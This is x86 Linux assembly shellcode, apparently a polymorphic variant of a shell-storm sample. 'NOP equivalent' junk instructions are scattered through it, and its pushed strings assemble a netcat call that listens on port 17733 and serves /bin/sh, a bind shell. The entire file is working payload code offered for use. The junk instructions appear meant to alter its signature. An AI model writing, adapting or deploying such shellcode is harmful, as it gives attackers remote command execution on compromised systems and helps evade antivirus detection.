; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-804.php

global _start

_start:

       sahf                    ; NOP Equivalent.
       nop                     ; NOP Equivalent.
       cmc                     ; NOP Equivalent.

       xor eax,eax             ; Zeroes out EAX.
       mul edx                 ; Zeroes out EDX through mul. NOP Equivalent.
       push eax                ; NOP Equivalent.
       pop edx                 ; NOP Equivalent.
       push edx                ; NOP Equivalent.
       pop eax                 ; NOP Equivalent.

       push 0x37373333         ; 7733
       std                     ; NOP Equivalent.
       push 0x3170762d         ; 1pv-
       mov edx, esp            ; Copies the value of ESP into EDX.
       push eax                ; Pushes EAX null dword (0x00000000)
       push 0x68732f6e         ; hs/n
       std                     ; NOP Equivalent.
       push 0x69622f65         ; ib/e
       sahf                    ; NOP Equivalent.
       push 0x76766c2d         ; vvl-
       mov ecx,esp             ; Copies the value of ESP into ECX

       push eax                ; NOP Equivalent.
       push 0x636e2f2f         ; cn//
       cmc                     ; NOP Equivalent.
       push 0x2f2f2f2f         ; ////
       inc edi                 ; NOP Equivalent.
       inc esi                 ; NOP Equivalent.

       push 0x6e69622f         ; nib/
       mov ebx, esp            ; Copies the value of ESP into EBX.
       push eax                ; Pushes EAX null dword (0x00000000)
       cld                     ; NOP Equivalent.
       push edx                ; Pushes value of EDX
       push ecx                ; Pushes value of ECX
       nop                     ; NOP Equivalent.
       push ebx                ; Pushes value of EBX
       cdq                     ; NOP Equivalent.
       mov  ecx,esp            ; Copies value from ESP to ECX
       push esi                ; NOP Equivalent.
       pop edi                 ; NOP Equivalent.
       push edi                ; NOP Equivalent.
       pop esi                 ; NOP Equivalent.
       pop ebp                 ; NOP Equivalent.
       mov al,11               ; Call to execve().
       int 0x80                ; Call to kernel.
